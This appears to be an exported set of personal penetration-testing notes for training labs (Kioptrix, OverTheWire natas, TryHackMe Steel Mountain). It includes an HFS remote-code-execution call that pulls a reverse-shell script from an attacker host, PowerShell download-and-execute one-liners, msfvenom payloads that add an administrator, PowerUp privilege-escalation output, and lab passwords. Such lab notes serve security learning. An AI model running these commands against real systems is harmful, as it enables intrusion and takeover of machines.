server should be<br /># e-mailed.  This address appears on some server-generated pages, such<br /># as error documents.  e.g. admin@your-domain.com<br />#<br />ServerAdmin you@example.com<br /><br />#<br /># ServerName gives the name and port that the server uses to identify itself.<br /># This can often be determined automatically, but we recommend you specify<br /># it explicitly to prevent problems during startup.<br />#<br /># If your host doesn&#39;t have a registered DNS name, enter its IP address here.<br />#<br />#ServerName www.example.com:80<br /><br />#<br /># DocumentRoot: The directory out of which you will serve your<br /># documents. By default, all requests are taken from this directory, but<br /># symbolic links and aliases may be used to point to other locations.<br />#<br />DocumentRoot &quot;/usr/local/www/apache22/data&quot;<br /><br />#<br /># Each directory to which Apache has access can be configured with respect<br /># to which services and features are allowed and/or disabled in that<br /># directory (and its subdirectories). <br />#<br /># First, we configure the &quot;default&quot; to be a very restrictive set of <br /># features.  <br />#<br />&lt;Directory /&gt;<br />    AllowOverride None<br />    Order deny,allow<br />    Deny from all<br />&lt;/Directory&gt;<br /><br />#<br /># Note that from this point forward you must specifically allow<br /># particular features to be enabled - so if something&#39;s not working as<br /># you might expect, make sure that you have specifically enabled it<br /># below.<br />#<br /><br />#<br /># This should be changed to whatever you set DocumentRoot to.<br />#<br />&lt;Directory &quot;/usr/local/www/apache22/data&quot;&gt;<br />    #<br />    # Possible values for the Options directive are &quot;None&quot;, &quot;All&quot;,<br />    # or any combination of:<br />    #   Indexes Includes FollowSymLinks SymLinksifOwnerMatch ExecCGI MultiViews<br />    #<br />    # Note that &quot;MultiViews&quot; must be named *explicitly* --- &quot;Options All&quot;<br />    # doesn&#39;t give it to you.<br />    #<br />    # The Options directive is both complicated and important.  Please see<br />    # http://httpd.apache.org/docs/2.2/mod/core.html#options<br />    # for more information.<br />    #<br />    Options Indexes FollowSymLinks<br /><br />    #<br />    # AllowOverride controls what directives may be placed in .htaccess files.<br />    # It can be &quot;All&quot;, &quot;None&quot;, or any combination of the keywords:<br />    #   Options FileInfo AuthConfig Limit<br />    #<br />    AllowOverride None<br /><br />    #<br />    # Controls who can get stuff from this server.<br />    #<br /><br />    Order allow,deny<br />    Allow from all<br />&lt;/Directory&gt;<br /><br />#<br /># DirectoryIndex: sets the file that Apache will serve if a directory<br /># is requested.<br />#<br />&lt;IfModule dir_module&gt;<br />    DirectoryIndex index.php index.html<br />&lt;/IfModule&gt;<br /><br />#<br /># The following lines prevent .htaccess and .htpasswd files from being <br /># viewed by Web clients. <br />#<br />&lt;FilesMatch &quot;^\.ht&quot;&gt;<br />    Order allow,deny<br />    Deny from all<br />    Satisfy All<br />&lt;/FilesMatch&gt;<br /><br />#<br /># ErrorLog: The location of the error log file.<br /># If you do not specify an ErrorLog directive within a &lt;VirtualHost&gt;<br /># container, error messages relating to that virtual host will be<br /># logged here.  If you *do* define an error logfile for a &lt;VirtualHost&gt;<br /># container, that host&#39;s errors will be logged there and not here.<br />#<br />ErrorLog &quot;/var/log/httpd-error.log&quot;                 &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br /><br />#<br /># LogLevel: Control the number of messages logged to the error_log.<br /># Possible values include: debug, info, notice, warn, error, crit,<br /># alert, emerg.<br />#<br />LogLevel warn<br /><br />&lt;IfModule log_config_module&gt;<br />    #<br />    # The following directives define some format nicknames for use with<br />    # a CustomLog directive (see below).<br />    #<br />    LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%{Referer}i\&quot; \&quot;%{User-Agent}i\&quot;&quot; combined<br />    LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b&quot; common<br /><br />    &lt;IfModule logio_module&gt;<br />      # You need to enable mod_logio.c to use %I and %O<br />      LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%{Referer}i\&quot; \&quot;%{User-Agent}i\&quot; %I %O&quot; combinedio<br />    &lt;/IfModule&gt;<br /><br />    #<br />    # The location and format of the access logfile (Common Logfile Format).<br />    # If you do not define any access logfiles within a &lt;VirtualHost&gt;<br />    # container, they will be logged here.  Contrariwise, if you *do*<br />    # define per-&lt;VirtualHost&gt; access logfiles, transactions will be<br />    # logged therein and *not* in this file.<br />    #<br />    #CustomLog &quot;/var/log/httpd-access.log&quot; common<br /><br />    #<br />    # If you prefer a logfile with access, agent, and referer information<br />    # (Combined Logfile Format) you can use the following directive.<br />    #<br />    CustomLog &quot;/var/log/httpd-access.log&quot; combined<br />&lt;/IfModule&gt;<br /><br />&lt;IfModule alias_module&gt;<br />    #<br />    # Redirect: Allows you to tell clients about documents that used to <br />    # exist in your server&#39;s namespace, but do not anymore. The client <br />    # will make a new request for the document at its new location.<br />    # Example:<br />    # Redirect permanent /foo http://www.example.com/bar<br /><br />    #<br />    # Alias: Maps web paths into filesystem paths and is used to<br />    # access content that does not live under the DocumentRoot.<br />    # Example:<br />    # Alias /webpath /full/filesystem/path<br />    #<br />    # If you include a trailing / on /webpath then the server will<br />    # require it to be present in the URL.  You will also likely<br />    # need to provide a &lt;Directory&gt; section to allow access to<br />    # the filesystem path.<br /><br />    #<br />    # ScriptAlias: This controls which directories contain server scripts. <br />    # ScriptAliases are essentially the same as Aliases, except that<br />    # documents in the target directory are treated as applications and<br />    # run by the server when requested rather than as documents sent to the<br />    # client.  The same rules about trailing &quot;/&quot; apply to ScriptAlias<br />    # directives as to Alias.<br />    #<br />    ScriptAlias /cgi-bin/ &quot;/usr/local/www/apache22/cgi-bin/&quot;<br /><br />&lt;/IfModule&gt;<br /><br />&lt;IfModule cgid_module&gt;<br />    #<br />    # ScriptSock: On threaded servers, designate the path to the UNIX<br />    # socket used to communicate with the CGI daemon of mod_cgid.<br />    #<br />    #Scriptsock /var/run/cgisock<br />&lt;/IfModule&gt;<br /><br />#<br /># &quot;/usr/local/www/apache22/cgi-bin&quot; should be changed to whatever your ScriptAliased<br /># CGI directory exists, if you have that configured.<br />#<br />&lt;Directory &quot;/usr/local/www/apache22/cgi-bin&quot;&gt;<br />    AllowOverride None<br />    Options None<br />    Order allow,deny<br />    Allow from all<br />&lt;/Directory&gt;<br /><br />#<br /># DefaultType: the default MIME type the server will use for a document<br /># if it cannot otherwise determine one, such as from filename extensions.<br /># If your server contains mostly text or HTML documents, &quot;text/plain&quot; is<br /># a good value.  If most of your content is binary, such as applications<br /># or images, you may want to use &quot;application/octet-stream&quot; instead to<br /># keep browsers from trying to display binary files as though they are<br /># text.<br />#<br />DefaultType text/plain<br /><br />&lt;IfModule mime_module&gt;<br />    #<br />    # TypesConfig points to the file containing the list of mappings from<br />    # filename extension to MIME-type.<br />    #<br />    TypesConfig etc/apache22/mime.types<br /><br />    #<br />    # AddType allows you to add to or override the MIME configuration<br />    # file specified in TypesConfig for specific file types.<br />    #<br />    #AddType application/x-gzip .tgz<br />    #<br />    # AddEncoding allows you to have certain browsers uncompress<br />    # information on the fly. Note: Not all browsers support this.<br />    #<br />    #AddEncoding x-compress .Z<br />    #AddEncoding x-gzip .gz .tgz<br />    #<br />    # If the AddEncoding directives above are commented-out, then you<br />    # probably should define those extensions to indicate media types:<br />    #<br />    AddType application/x-compress .Z<br />    AddType application/x-gzip .gz .tgz<br /><br />    #<br />    # AddHandler allows you to map certain file extensions to &quot;handlers&quot;:<br />    # actions unrelated to filetype. These can be either built into the server<br />    # or added with the Action directive (see below)<br />    #<br />    # To use CGI scripts outside of ScriptAliased directories:<br />    # (You will also need to add &quot;ExecCGI&quot; to the &quot;Options&quot; directive.)<br />    #<br />    #AddHandler cgi-script .cgi<br /><br />    # For type maps (negotiated resources):<br />    #AddHandler type-map var<br /><br />    #<br />    # Filters allow you to process content before it is sent to the client.<br />    #<br />    # To parse .shtml files for server-side includes (SSI):<br />    # (You will also need to add &quot;Includes&quot; to the &quot;Options&quot; directive.)<br />    #<br />    #AddType text/html .shtml<br />    #AddOutputFilter INCLUDES .shtml<br /><br />    AddType application/x-httpd-php .php<br />    AddType application/x-httpd-php-source .phps<br /><br />&lt;/IfModule&gt;<br /><br />#<br /># The mod_mime_magic module allows the server to use various hints from the<br /># contents of the file itself to determine its type.  The MIMEMagicFile<br /># directive tells the module where the hint definitions are located.<br />#<br />#MIMEMagicFile etc/apache22/magic<br /><br />#<br /># Customizable error responses come in three flavors:<br /># 1) plain text 2) local redirects 3) external redirects<br />#<br /># Some examples:<br />#ErrorDocument 500 &quot;The server made a boo boo.&quot;<br />#ErrorDocument 404 /missing.html<br />#ErrorDocument 404 &quot;/cgi-bin/missing_handler.pl&quot;<br />#ErrorDocument 402 http://www.example.com/subscription_info.html<br />#<br /><br />#<br /># MaxRanges: Maximum number of Ranges in a request before<br /># returning the entire resource, or 0 for unlimited<br /># Default setting is to accept 200 Ranges<br />#MaxRanges 0<br /><br />#<br /># EnableMMAP and EnableSendfile: On systems that support it, <br /># memory-mapping or the sendfile syscall is used to deliver<br /># files.  This usually improves server performance, but must<br /># be turned off when serving from networked-mounted <br /># filesystems or if support for these functions is otherwise<br /># broken on your system.<br />#<br />#EnableMMAP off<br />#EnableSendfile off<br /><br /># Supplemental configuration<br />#<br /># The configuration files in the etc/apache22/extra/ directory can be <br /># included to add extra features or to modify the default configuration of <br /># the server, or you may simply copy their contents here and change as <br /># necessary.<br /><br /># Server-pool management (MPM specific)<br />#Include etc/apache22/extra/httpd-mpm.conf<br /><br /># Multi-language error messages<br />#Include etc/apache22/extra/httpd-multilang-errordoc.conf<br /><br /># Fancy directory listings<br />#Include etc/apache22/extra/httpd-autoindex.conf<br /><br /># Language settings<br />#Include etc/apache22/extra/httpd-languages.conf<br /><br /># User home directories<br />#Include etc/apache22/extra/httpd-userdir.conf<br /><br /># Real-time info on requests and configuration<br />#Include etc/apache22/extra/httpd-info.conf<br /><br /># Virtual hosts<br />#Include etc/apache22/extra/httpd-vhosts.conf<br /><br /># Local access to the Apache HTTP Server Manual<br />#Include etc/apache22/extra/httpd-manual.conf<br /><br /># Distributed authoring and versioning (WebDAV)<br />#Include etc/apache22/extra/httpd-dav.conf<br /><br /># Various default settings<br />#Include etc/apache22/extra/httpd-default.conf<br /><br /># Secure (SSL/TLS) connections<br />#Include etc/apache22/extra/httpd-ssl.conf<br />#<br /># Note: The following must must be present to support<br />#       starting without SSL on platforms with no /dev/random equivalent<br />#       but a statically compiled-in mod_ssl.<br />#<br />&lt;IfModule ssl_module&gt;<br />SSLRandomSeed startup builtin<br />SSLRandomSeed connect builtin<br />&lt;/IfModule&gt;<br /><br />SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser<br /><br />&lt;VirtualHost *:8080&gt;<br />    DocumentRoot /usr/local/www/apache22/data2<br /><br />&lt;Directory &quot;/usr/local/www/apache22/data2&quot;&gt;<br />    Options Indexes FollowSymLinks<br />    AllowOverride All<br />    Order allow,deny<br />    Allow from env=Mozilla4_browser<br />&lt;/Directory&gt;<br /><br /><br /><br />&lt;/VirtualHost&gt;<br /><br /><br />Include etc/apache22/Includes/*.conf<br /></code></div><div class='page'><h1 class='title level-5'>flag</h1><br/># cat congrats.txt<br />If you are reading this, it means you got root (or cheated).<br />Congratulations either way...<br /><br />Hope you enjoyed this new VM of mine. As always, they are made for the beginner in <br />mind, and not meant for the seasoned pentester. However this does not mean one <br />can&#39;t enjoy them.<br /><br />As with all my VMs, besides getting &quot;root&quot; on the system, the goal is to also<br />learn the basics skills needed to compromise a system. Most importantly, in my mind,<br />are information gathering &amp; research. Anyone can throw massive amounts of exploits<br />and &quot;hope&quot; it works, but think about the traffic.. the logs... Best to take it<br />slow, and read up on the information you gathered and hopefully craft better<br />more targetted attacks. <br /><br />For example, this system is FreeBSD 9. Hopefully you noticed this rather quickly.<br />Knowing the OS gives you any idea of what will work and what won&#39;t from the get go.<br />Default file locations are not the same on FreeBSD versus a Linux based distribution.<br />Apache logs aren&#39;t in &quot;/var/log/apache/access.log&quot;, but in &quot;/var/log/httpd-access.log&quot;.<br />It&#39;s default document root is not &quot;/var/www/&quot; but in &quot;/usr/local/www/apache22/data&quot;.<br />Finding and knowing these little details will greatly help during an attack. Of course<br />my examples are specific for this target, but the theory applies to all systems.<br /><br />As a small exercise, look at the logs and see how much noise you generated. Of course<br />the log results may not be accurate if you created a snapshot and reverted, but at least<br />it will give you an idea. For fun, I installed &quot;OSSEC-HIDS&quot; and monitored a few things.<br />Default settings, nothing fancy but it should&#39;ve logged a few of your attacks. Look<br />at the following files:<br />/root/folderMonitor.log<br />/root/httpd-access.log (softlink)<br />/root/ossec-alerts.log (softlink)<br /><br />The folderMonitor.log file is just a cheap script of mine to track created/deleted and modified<br />files in 2 specific folders. Since FreeBSD doesn&#39;t support &quot;iNotify&quot;, I couldn&#39;t use OSSEC-HIDS <br />for this.<br />The httpd-access.log is rather self-explanatory .<br />Lastly, the ossec-alerts.log file is OSSEC-HIDS is where it puts alerts when monitoring certain<br />files. This one should&#39;ve detected a few of your web attacks.<br /><br />Feel free to explore the system and other log files to see how noisy, or silent, you were.<br />And again, thank you for taking the time to download and play.<br />Sincerely hope you enjoyed yourself.<br /><br />Be good...<br /><br /><br />loneferret<br /><a href="http://www.kioptrix.com">http://www.kioptrix.com</a><br /><br /><br />p.s.: Keep in mind, for each &quot;web attack&quot; detected by OSSEC-HIDS, by<br />default it would&#39;ve blocked your IP (both in hosts.allow &amp; Firewall) for<br />600 seconds. I was nice enough to remove that part :)<br /># <br /></div><div class='page'><h1 class='title level-2'>WeirdShit</h1><br/></div><div class='page'><h1 class='title level-3'>AvengerCon</h1><br/>148<br />200</div><div class='page'><h1 class='title level-4'>200</h1><br/>DONE<br /><br />python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;);&#39;</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>nmap -sC -sV -p- -oN Nmap.txt 192.168.5.200<br /><br />curl -v -X OPTIONS http://192.168.5.200:80/</div><div class='page'><h1 class='title level-4'>148</h1><br/></div><div class='page'><h1 class='title level-4'>199</h1><br/>172.16.4.199</div><div class='page'><h1 class='title level-3'>natas</h1><br/>natas9.natas.labs.overthewire.org/<br />cat /etc/natas_webpass/natas10<br /><br /><br />natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14<br />natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ<br />natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq<br />natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1<br />natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9<br />natas8 DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe<br />natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl<br />natas10 nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu<br />natas11 U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</div><div class='page'><h1 class='title level-3'>TCM_WinPE</h1><br/></div><div class='page'><h1 class='title level-4'>Steel Mountain (THM)</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>IIS 8.5 = 2012 R2 | 8.1<br /><br />python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 &quot;c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#39;<a href="http://10.10.14.4/shells/mini-reverse.ps1')"">http://10.10.14.4/shells/mini-reverse.ps1&#39;)&quot;</a><br /><br />powershell.exe -exec Bypass &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;<a href="http://10.11.0.186/Sherlock.ps1')"">http://10.9.0.59/jaws.ps1&#39;)&quot;</a> <br /><br /><br /><br /><br />bill<br />PMBAf5KhZAxVhvqb<br /><br />cmdkey /list<br />also bill<br /><br /><br />Advanced SystemCare Service 9                           AdvancedSystemCareService9  C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe                    Auto         AWS Lite Guest Agent                                    AWSLiteAgent                C:\Program Files\Amazon\XenTools\LiteAgent.exe                                     Auto         IObit Uninstaller Service                               IObitUnSvr                  C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe                       Auto         LiveUpdate                                              LiveUpdateSvc               C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe                             Auto  <br /><br /><br />msfvenom -p windows/exec CMD=&#39;net localgroup administrators bill /add&#39; -f exe-service -o program.exe<br /><br />powershell.exe -exec Bypass &quot;IEX(New-Object Net.WebClient).Downloadfile(&#39;<a href="http://10.11.0.186/Sherlock.ps1')"">http://10.9.0.59/IUService.exe&#39;,&#39;c:\program files (x86)\IObit\IObit Uninstaller\IUService.exe&#39;)&quot;</a> <br /><br />powershell.exe -exec Bypass &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;<a href="http://10.11.0.186/Sherlock.ps1')"">http://10.9.0.59/PowerUp.ps1&#39;); Invoke-ALLCHECKS&quot;</a> <br />powershell.exe -exec Bypass &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;<a href="http://10.11.0.186/Sherlock.ps1')"">http://10.9.0.59/PowerUp.ps1&#39;)&quot;</a> <br /><br /><br />ServiceName    : AdvancedSystemCareService9<br />Path           : C:\Program Files (x86)\IObit\Advanced <br />                 SystemCare\ASCService.exe<br />ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; <br />                 Permissions=AppendData/AddSubdirectory}<br />StartName      : LocalSystem<br />AbuseFunction  : Write-ServiceBinary -Name &#39;AdvancedSystemCareService9&#39; -Path <br />                 &lt;HijackPath&gt;<br />CanRestart     : True<br />Name           : AdvancedSystemCareService9<br />Check          : Unquoted Service Paths<br /><br /><br />powershell.exe -exec Bypass &quot;IEX(New-Object Net.WebClient).Downloadfile(&#39;<a href="http://10.11.0.186/Sherlock.ps1')"">http://10.9.0.59/Advanced.exe&#39;,&#39;C:\Program Files (x86)\IObit\Advanced.exe&#39;)&quot;</a> <br /><br />msfvenom -p windows/exec CMD=&#39;net localgroup administrators bill /add&#39; -f exe -o Advanced.ex</div><div class='page'><h1 class='title level-6'>PowerUp</h1><br/>root@kali:/Yeet/Machines/UPE/SteelMountain# nc 10.10.146.204 3232 <br />Windows PowerShell running as user bill on STEELMOUNTAIN<br />Copyright (C) 2015 Microsoft Corporation. All rights reserved.<br /><br />PS C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt;powershell.exe -exec Bypass &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;<a href="http://10.9.0.59/PowerUp.ps1');">http://10.9.0.59/PowerUp.ps1&#39;);</a> Invoke-ALLCHECKS&quot; <br /><br />[*] Running Invoke-AllChecks<br /><br /><br />[*] Checking if user is in a local group with administrative privileges...<br /><br /><br />[*] Checking for unquoted service paths...<br /><br /><br />ServiceName   : AdvancedSystemCareService9<br />Path          : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe<br />StartName     : LocalSystem<br />AbuseFunction : Write-ServiceBinary -ServiceName &#39;AdvancedSystemCareService9&#39; <br />                -Path &lt;HijackPath&gt;<br /><br />ServiceName   : AWSLiteAgent<br />Path          : C:\Program Files\Amazon\XenTools\LiteAgent.exe<br />StartName     : LocalSystem<br />AbuseFunction : Write-ServiceBinary -ServiceName &#39;AWSLiteAgent&#39; -Path <br />                &lt;HijackPath&gt;<br /><br />ServiceName   : IObitUnSvr<br />Path          : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe<br />StartName     : LocalSystem<br />AbuseFunction : Write-ServiceBinary -ServiceName &#39;IObitUnSvr&#39; -Path <br />                &lt;HijackPath&gt;<br /><br />ServiceName   : LiveUpdateSvc<br />Path          : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe<br />StartName     : LocalSystem<br />AbuseFunction : Write-ServiceBinary -ServiceName &#39;LiveUpdateSvc&#39; -Path <br />                &lt;HijackPath&gt;<br /><br /><br /><br /><br /><br />[*] Checking service executable and argument permissions...<br /><br /><br />ServiceName    : IObitUnSvr<br />Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe<br />ModifiableFile : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe<br />StartName      : LocalSystem<br />AbuseFunction  : Install-ServiceBinary -ServiceName &#39;IObitUnSvr&#39;<br /><br /><br /><br /><br /><br />[*] Checking service permissions...<br /><br /><br />[*] Checking %PATH% for potentially hijackable .dll locations...<br /><br /><br />[*] Checking for AlwaysInstallElevated registry key...<br /><br /><br />[*] Checking for Autologon credentials in registry...<br /><br /><br />DefaultDomainName    : <br />DefaultUserName      : bill<br />DefaultPassword      : PMBAf5KhZAxVhvqb<br />AltDefaultDomainName : <br />AltDefaultUserName   : <br />AltDefaultPassword   : <br /><br /><br /><br /><br /><br />[*] Checking for vulnerable registry autoruns and configs...<br /><br /><br />[*] Checking for vulnerable schtask files/configs...<br /><br /><br />[*] Checking for unattended install files...<br /><br /><br />[*] Checking for encrypted web.config strings...<br /><br /><br />[*] Checking for encrypted application pool and virtual directory passwords...<br /><br /><br /></div><div class='page'><h1 class='title level-6'>PowerUp2</h1><br/>PS C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt;powershell.exe -exec Bypass &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;<a href="http://10.9.0.59/PowerUp.ps1')"">http://10.9.0.59/PowerUp.ps1&#39;)&quot;</a> <br /><br /><br />ServiceName    : AdvancedSystemCareService9<br />Path           : C:\Program Files (x86)\IObit\Advanced <br />                 SystemCare\ASCService.exe<br />ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; <br />                 Permissions=AppendData/AddSubdirectory}<br />StartName      : LocalSystem<br />AbuseFunction  : Write-ServiceBinary -Name &#39;AdvancedSystemCareService9&#39; -Path <br />                 &lt;HijackPath&gt;<br />CanRestart     : True<br />Name           : AdvancedSystemCareService9<br />Check          : Unquoted Service Paths<br /><br />ServiceName    : AdvancedSystemCareService9<br />Path           : C:\Program Files (x86)\IObit\Advanced <br />                 SystemCare\ASCService.exe<br />ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; <br />                 Permissions=WriteData/AddFile}<br />StartName      : LocalSystem<br />AbuseFunction  : Write-ServiceBinary -Name &#39;AdvancedSystemCareService9&#39; -Path <br />                 &lt;HijackPath&gt;<br />CanRestart     : True<br />Name           : AdvancedSystemCareService9<br />Check          : Unquoted Service Paths<br /><br />ServiceName    : AdvancedSystemCareService9<br />Path           : C:\Program Files (x86)\IObit\Advanced <br />                 SystemCare\ASCService.exe<br />ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; <br />                 IdentityReference=STEELMOUNTAIN\bill; <br />                 Permissions=System.Object[]}<br />StartName      : LocalSystem<br />AbuseFunction  : Write-ServiceBinary -Name &#39;AdvancedSystemCareService9&#39; -Path <br />                 &lt;HijackPath&gt;<br />CanRestart     : True<br />Name           : AdvancedSystemCareService9<br />Check          : Unquoted Service Paths<br /><br />ServiceName    : AdvancedSystemCareService9<br />Path           : C:\Program Files (x86)\IObit\Advanced <br />                 SystemCare\ASCService.exe<br />ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced <br />                 SystemCare\ASCService.exe; <br />                 IdentityReference=STEELMOUNTAIN\bill; <br />                 Permissions=System.Object[]}<br />StartName      : LocalSystem<br />AbuseFunction  : Write-ServiceBinary -Name &#39;AdvancedSystemCareService9&#39; -Path <br />                 &lt;HijackPath&gt;<br />CanRestart     : True<br />Name           : AdvancedSystemCareService9<br />Check          : Unquoted Service Paths<br /><br />ServiceName    : AWSLiteAgent<br />Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe<br />ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; <br />                 Permissions=AppendData/AddSubdirectory}<br />StartName      : LocalSystem<br />AbuseFunction  : Write-ServiceBinary -Name &#39;AWSLiteAgent&#39; -Path &lt;HijackPath&gt;<br />CanRestart     : False<br />Name           : AWSLiteAgent<br />Check          : Unquoted Service Paths<br /><br />ServiceName    : AWSLiteAgent<br />Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe<br />ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; <br />                 Permissions=WriteData/AddFile}<br />StartName      : LocalSystem<br />AbuseFunction  : Write-ServiceBinary -Name &#39;AWSLiteAgent&#39; -Path &lt;HijackPath&gt;<br />CanRestart     : False<br />Name           : AWSLiteAgent<br />Check          : Unquoted Service Paths<br /><br />ServiceName    : IObitUnSvr<br />Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe<br />ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; <br />                 Permissions=AppendData/AddSubdirectory}<br />StartName      : LocalSystem<br />AbuseFunction  : Write-ServiceBinary -Name &#39;IObitUnSvr&#39; -Path &lt;HijackPath&gt;<br />CanRestart     : False<br />Name           : IObitUnSvr<br />Check          : Unquoted Service Paths<br /><br />ServiceName    : IObitUnSvr<br />Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe<br />ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; <br />                 Permissions=WriteData/AddFile}<br />StartName      : LocalSystem<br />AbuseFunction  : Write-ServiceBinary -Name &#39;IObitUnSvr&#39; -Path &lt;HijackPath&gt;<br />CanRestart     : False<br />Name           : IObitUnSvr<br />Check          : Unquoted Service Paths<br /><br />ServiceName    : IObitUnSvr<br />Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe<br />ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; <br />                 IdentityReference=STEELMOUNTAIN\bill; <br />                 Permissions=System.Object[]}<br />StartName      : LocalSystem<br />AbuseFunction  : Write-ServiceBinary -Name &#39;IObitUnSvr&#39; -Path &lt;HijackPath&gt;<br />CanRestart     : False<br />Name           : IObitUnSvr<br />Check          : Unquoted Service Paths<br /><br />ServiceName    : IObitUnSvr<br />Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe<br />ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit <br />                 Uninstaller\IUService.exe; <br />                 IdentityReference=STEELMOUNTAIN\bill; <br />                 Permissions=System.Object[]}<br />StartName      : LocalSystem<br />AbuseFunction  : Write-ServiceBinary -Name &#39;IObitUnSvr&#39; -Path &lt;HijackPath&gt;<br />CanRestart     : False<br />Name           : IObitUnSvr<br />Check          : Unquoted Service Paths<br /><br />ServiceName    : LiveUpdateSvc<br />Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe<br />ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; <br />                 Permissions=AppendData/AddSubdirectory}<br />StartName      : LocalSystem<br />AbuseFunction  : Write-ServiceBinary -Name &#39;LiveUpdateSvc&#39; -Path &lt;HijackPath&gt;<br />CanRestart     : False<br />Name           : LiveUpdateSvc<br />Check          : Unquoted Service Paths<br /><br />ServiceName    : LiveUpdateSvc<br />Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe<br />ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; <br />                 Permissions=WriteData/AddFile}<br />StartName      : LocalSystem<br />AbuseFunction  : Write-ServiceBinary -Name &#39;LiveUpdateSvc&#39; -Path &lt;HijackPath&gt;<br />CanRestart     : False<br />Name           : LiveUpdateSvc<br />Check          : Unquoted Service Paths<br /><br />ServiceName    : LiveUpdateSvc<br />Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe<br />ModifiablePath : @{ModifiablePath=C:\Program Files <br />                 (x86)\IObit\LiveUpdate\LiveUpdate.exe; <br />                 IdentityReference=STEELMOUNTAIN\bill; <br />                 Permissions=System.Object[]}<br />StartName      : LocalSystem<br />AbuseFunction  : Write-ServiceBinary -Name &#39;LiveUpdateSvc&#39; -Path &lt;HijackPath&gt;<br />CanRestart     : False<br />Name           : LiveUpdateSvc<br />Check          : Unquoted Service Paths<br /><br />ServiceName                     : AdvancedSystemCareService9<br />Path                            : C:\Program Files (x86)\IObit\Advanced <br />                                  SystemCare\ASCService.exe<br />ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced <br />                                  SystemCare\ASCService.exe<br />ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, <br />                                  ReadData/ListDirectory...}<br />ModifiableFileIdentityReference : STEELMOUNTAIN\bill<br />StartName                       : LocalSystem<br />AbuseFunction                   : Install-ServiceBinary -Name <br />                                  &#39;AdvancedSystemCareService9&#39;<br />CanRestart                      : True<br />Name                            : AdvancedSystemCareService9<br />Check                           : Modifiable Service Files<br /><br />ServiceName                     : IObitUnSvr<br />Path                            : C:\Program Files (x86)\IObit\IObit <br />                                  Uninstaller\IUService.exe<br />ModifiableFile                  : C:\Program Files (x86)\IObit\IObit <br />                                  Uninstaller\IUService.exe<br />ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, <br />                                  ReadData/ListDirectory...}<br />ModifiableFileIdentityReference : STEELMOUNTAIN\bill<br />StartName                       : LocalSystem<br />AbuseFunction                   : Install-ServiceBinary -Name &#39;IObitUnSvr&#39;<br />CanRestart                      : False<br />Name                            : IObitUnSvr<br />Check                           : Modifiable Service Files<br /><br />ServiceName                     : LiveUpdateSvc<br />Path                            : C:\Program Files <br />                                  (x86)\IObit\LiveUpdate\LiveUpdate.exe<br />ModifiableFile                  : C:\Program Files <br />                                  (x86)\IObit\LiveUpdate\LiveUpdate.exe<br />ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, <br />                                  ReadData/ListDirectory...}<br 